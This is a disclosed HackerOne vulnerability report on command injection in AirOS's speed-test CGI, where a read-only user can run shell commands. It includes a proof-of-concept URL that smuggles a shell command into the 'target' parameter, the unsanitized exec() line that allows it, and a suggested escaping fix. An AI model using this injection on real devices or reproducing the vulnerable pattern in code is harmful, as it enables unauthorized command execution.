# Read-Only user can execute arbitraty shell commands on AirOS

## Report Details
- **Report ID**: 119317
- **URL**: https://hackerone.com/reports/119317
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-02-28T19:21:10.574Z
- **Disclosed**: 2016-08-05T09:36:35.197Z

## Reporter
- **Username**: rbran
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ui

## Vulnerability Information
On the last version of AirOS (including the 8.0 beta) is possible to a read-only user to inject shell commands.

Is possible to exploit the vulnerability using the following URL (adjusting the `airosid` value to a valid session):
```
https://192.168.0.21/sptest_action.cgi?ticket=426&action=start&target=192.168.0.100%3Btouch%20/tmp/vulnerable%3B&port=80&airosid=30171452416bb910e94ce2f802d73b89&_=1456685928091
```


The vulnerability happen in the 'sptest.inc:46', that don't sanitizes the user input. The Vulnerable code:
```
exec("echo " + $ticket + " init " + $target + " > /proc/net/spdtst/stctl", $lines, $res);
```

Possible mitigation:
```
exec("echo " + EscapeShellCmd($ticket) + " init " + EscapeShellCmd($target) + " > /proc/net/spdtst/stctl", $lines, $res);
```

## Attachments
No attachments
